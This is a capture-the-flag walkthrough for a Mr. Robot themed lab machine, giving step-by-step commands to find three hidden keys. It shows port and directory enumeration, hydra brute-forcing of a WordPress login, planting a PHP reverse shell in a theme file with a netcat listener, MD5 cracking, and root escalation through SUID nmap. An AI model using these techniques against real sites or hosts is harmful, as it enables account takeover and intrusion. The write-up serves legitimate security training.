# 1 Hack the machine

## Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

### What is key 1?

Hint: Robots

This one is pretty easy, we could easily brute force it just by going into `http://<IP>/robots.txt`, but let's do it properly

1. First enumerate the server with nmap

```bash
nmap -p- -Pn <IP>
```

- `-p-`: Allow us to scan all 65535 TCP ports
- `-Pn`: Skips the host discovery process (ping scan)

![SCREEN01](https://github.com/user-attachments/assets/70a1f790-0fbc-417e-94bc-147c59b2e52b)

2. Enumerate directories with gobuster

```bash
gobuster dir -u http://<IP> -w /root/Tools/wordlists/dirbuster/directory-list-1.0.txt
```

- `-u`: Specifies the URL to scan
- `-w`: Specifies the wordlist file used for brute-forcing

3. Now that we have officially found it - go to `http://<IP>/robots.txt`. Here we can see two more paths: `fsocity.dic` and `key-1-of-3.txt`. The second one in `http://<IP>/key-1-of-3.txt` contains first key.

### What is key 2?

Hint: There's something fishy about this wordlist... Why is it so long?

The `fsocity.dic` looks like a credentials list

1. While enumerating with gobuster we have also found `http://<IP>/wp-login.php`. When trying to login with random credentials, this returns, a handy error saying '**ERROR: Invalid username**' - thanks to this we can prepare list of valid usernames

2. But first things first, the list contains duplicates so clean it up a bit:

```bash
sort fsocity.dic | uniq -d > fsocity-unique.dic
sort fsocity.dic | uniq -u >> fsocity-unique.dic
wc -w fsocity-unique.dic
```

- `-d`: Outputs lines that appear multiple times
- `-u`: Outputs lines that appear exactly once
- `-w`: Count words

3. While logging in to `http://<IP>/wp-login` in DevTools -> Network we can see the Request parameters

![SCREEN02](https://github.com/user-attachments/assets/ea686888-9b26-431c-a2c1-509a77e273cf)

4. hydra payload time:

```bash
hydra -L fsocity-unique.dic -p test <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

- `-L`: Specifies a list of usernames to try from the file
- `-p`: Uses a single password for all attempts
- `-t`: Number of parallel connections to use for the attack

![SCREEN03](https://github.com/user-attachments/assets/27d74201-63ce-4e5f-bce6-08d8c88297f1)

5. With the correct username, the error changes to '**ERROR: The password you entered for the username is incorrect.**'

```bash
hydra -l elliot -P fsocity-unique.dic <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

- `-l`: Specifies a single username to use for all attempts
- `-P`: Specifies a list of passwords to try from the file
- `-t`: Number of parallel connections to use for the attack

![SCREEN04](https://github.com/user-attachments/assets/f4d896c5-11de-47bf-a840-d24504aba526)

6. After logging in, set the netcat listener, get php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), and paste to archive.php in Appearance -> Editor view. Update file (remember to change `$ip` and `$port`) and go to the `http://<IP>/wp-content/themes/twentyfifteen/archive.php` to activate the reverse shell

```bash
nc -lvnp 4444
```

- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: Skip DNS lookup
- `-p`: Specify the port number to listen on

![SCREEN05](https://github.com/user-attachments/assets/dd242322-9f25-44f7-a798-d2ec7b00b77b)

7. In home/robot there are two files `key-2-of-3.txt` and `password.raw-md5`. Unfortunately we don't have access premission to access second flag as of now, but we can crack the MD5 password and try as a robot user

```bash
ls -la home/robot
cat home/robot/key-2-of-3.txt
cat home/robot/password.raw-md5
```

![SCREEN06](https://github.com/user-attachments/assets/cc3c1ed8-6a65-4f44-8fba-76f03059d77a)

8. Crack the password using [Crack Station](https://crackstation.net/) and login as robot and get the flag

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
su robot
pwd
cat home/robot/key-2-of-3.txt
```

![SCREEN07](https://github.com/user-attachments/assets/65af9fef-32cc-4575-a435-fc722c557572)

### What is key 3?

Hint: nmap

1. Search for files with special permissions. These are files that always execute as the user who owns the file, regardless of the user passing the command. Nmap is on the list.

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SCREEN08](https://github.com/user-attachments/assets/d7732b8d-9aa5-4b37-a650-e2d4e4ea46dc)

2. Check [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) for nmap, go to the nmap directory and follow the instructions

```bash
cd /usr/local/bin
nmap --interactive
!sh
cat /root/key-3-of-3.txt
```

![SCREEN09](https://github.com/user-attachments/assets/7b793ef0-1434-4ad0-83b6-af72c2daf145)

